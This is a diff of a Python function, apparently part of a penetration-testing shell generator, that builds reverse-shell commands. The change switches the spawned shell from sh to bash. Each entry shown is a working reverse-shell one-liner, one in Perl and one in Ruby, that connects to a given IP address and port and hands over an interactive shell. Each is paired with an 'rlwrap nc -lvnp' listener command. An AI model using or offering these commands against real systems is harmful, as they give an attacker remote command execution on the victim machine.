@@ -201,7 +201,7 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "description":
         "Perl reverse shell",
         "reverse":
-        'perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
+        'perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};\''
         % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
@@ -272,7 +272,7 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "description":
         "Ruby reverse shell",
         "reverse":
-        "ruby -rsocket -e\'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))\'" %
+        "ruby -rsocket -e\'spawn(\"bash\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))\'" %
         (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
